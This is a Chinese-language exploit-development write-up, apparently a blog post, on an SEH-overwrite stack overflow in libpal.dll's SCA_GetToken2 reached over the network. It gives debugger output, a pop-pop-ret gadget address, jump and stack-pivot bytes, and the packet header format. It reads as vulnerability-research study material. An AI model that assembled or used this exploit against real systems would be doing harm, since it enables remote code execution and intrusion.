---
layout: default
---

# 1.确定溢出位置

>libpal.int __cdecl SCA_GetToken2(char const *, unsigned long *, char *, unsigned long, char)
>未正确分配局部变量栈空间

```
数据读取流程:
	####1.此处会判断length <= 400H分配栈空间, length>400H分配堆空间
	WaitForMessage(ulong,SCA_NetMessage *)
		####2.读取数据定入栈空间(正常写入数据到栈空间)			
	-> ws2_32.recv 					
		####3.开始解析数据
	-> Deserialize(char const *) 	
			####4.将数据复制到局部数量上(未正确设置栈空间,数据溢出(104H字节))
		->SCA_GetToken2(char const *, unsigned long *, char *, unsigned long, char)
			####5.引用栈指针报错
		-> Deserialize(char const *, unsigned long *) 
```
# 2.栈空间检查

```
通过上面的逻辑分析得到:
	1. 第2步中有一个完整的数据写入了栈空间.(合法)
	2. 第4步中将第2步写入的数据进行了部分读取(104H)并溢出.(非法)
	3. 我们的目标是使溢出数据覆盖SEH.(满足)
```

> 验证一下SEH是否被覆盖

```
0:009> !teb
TEB at 00312000
    ExceptionList:        01befe1c
    StackBase:            01bf0000
    StackLimit:           01bef000
	...

0:009> dt _EXCEPTION_REGISTRATION_RECORD 01befe1c
ntdll!_EXCEPTION_REGISTRATION_RECORD
   +0x000 Next             : 0x01beff54 _EXCEPTION_REGISTRATION_RECORD
   +0x004 Handler          : 0x0082df5b _EXCEPTION_DISPOSITION  libpal!md5_starts+0
   
0:009> dt _EXCEPTION_REGISTRATION_RECORD 0x01beff54 
ntdll!_EXCEPTION_REGISTRATION_RECORD
   +0x000 Next             : 41414141 _EXCEPTION_REGISTRATION_RECORD
   +0x004 Handler          : 41414141 _EXCEPTION_DISPOSITION  libspp!pcre_exec+0
```

> 成功覆盖. 此时栈内应该有2个发送的数据: 一个完整数据(合法),一个不完整数据(非法).

```
//第一次数据全部写入栈(合法),但没有覆盖到关键SEH
0:009> dds 01befc70-1e0
01befa90  41414141
01befa94  41414141
01befa98  41414141
01befa9c  41414141
01befaa0  90909090
01befaa4  90909090
01befaa8  90909090
01befaac  90909090
01befab0  90909090

//第二次溢出数据只写入104H个数据(非法),但覆盖到关键SEH
0:009> dds 01bf0000-b4
01beff4c  41414141
01beff50  41414141
01beff54  41414141
01beff58  41414141
01beff5c  90909090
01beff60  90909090
01beff64  90909090
01beff68  90909090
01beff6c  90909090

```
# 3. 触发ShellCode

> 1. 怎么使SEH跳转到ShellCode,虽然EIP己经能够被我们控制,但需要jmp到栈上执行代码.

```
SEH handler原型为:
typedef EXCEPTION_DISPOSITION _except_handler (*PEXCEPTION_ROUTINE) (  
    IN PEXCEPTION_RECORD ExceptionRecord,  
    IN VOID EstablisherFrame,                      //_EXCEPTION_REGISTRATION_RECORD 指向调用的SEH地址
    IN OUT PCONTEXT ContextRecord,  
    IN OUT PDISPATCHER_CONTEXT DispatcherContext  
); 

第二个参数刚好指向调用的SEH地址.那么在调用_except_handler时,栈空间大致如下:
esp			->>>	ret address
esp + 4		->>>	ExceptionRecord
esp + 8 	->>>	EstablisherFrame
esp + C 	->>>	ContextRecord
esp + 10 	->>>	DispatcherContext  
esp + 14 	->>>

那么只需要:
pop reg
pop reg
ret
就可以jmp到EstablisherFrame地址来执行代码.这个地址就是:0x01beff54 

通过搜索在libspp.dll中找到了这个地址:0x1015a2f0 (pop eax;pop ebx;ret)

```

> 2.另一个问题.

```
此时SEH变为:
0:009> dt _EXCEPTION_REGISTRATION_RECORD 0x01beff54 
ntdll!_EXCEPTION_REGISTRATION_RECORD
   +0x000 Next             : 41414141  _EXCEPTION_REGISTRATION_RECORD
   +0x004 Handler          : 1015a2f0  _EXCEPTION_DISPOSITION  libspp!pcre_exec+0

_except_handler成功被调用执行了pop,pop,ret后,EIP会跳转到:
0x01beff54  41414141	(无用代码)
0x01beff58  1015a2f0	(不需要执行)
很明显不是我们想要的.

这时需要把41414141换成一个jmp,即可以解决41414141执行问题,又可以跳过下一行代码0x01beff54.
把41414141 换成 EB06可以轻松解决这个问题.
01beff54  06eb9090
01beff58  1015a2f0 libspp!pcre_exec+0x16460
```
> 3. 跳转到完整的ShellCode.

```
根据上面所述: 
	这里EIP所指向的地址ShellCode并不完整,那么下一步就是让EIP跳转到完整的ShellCode地址去执行.
	此时只需要计算一下ESP的偏移,然后jmp过去即可解决.
 	add sp,0xc18 ;为什么要用sp,因为使用esp会存在0x00(bad characters)
 	jmp esp

01beff54  06eb9090
01beff58  1015a2f0 libspp!pcre_exec+0x16460
01beff5c  81669090
01beff60  ff0c18c4
01beff64  909090e4
```

# 4.一些补充

```
数据包格式:
先读24(0x18)字节包头
  header =  b"\x75\x19\xba\xab"           	#包头校验码 cmp dword ptr ss:[esp+20],ABBA1975  
  header += b"\x03\x00\x00\x00"           	#???
  header += b"\x00\x40\x00\x00"           	#???
  header += pack('<I', len(包体数据))  		#长度校验
  header += pack('<I', len(包体数据))  		#长度
  header += pack('<I', 包体数据[-1])   		#包体最后一个字节(用于检验包体完整性) 
  后接包体数据
```

> exploit参考: https://www.exploit-db.com/exploits/43936

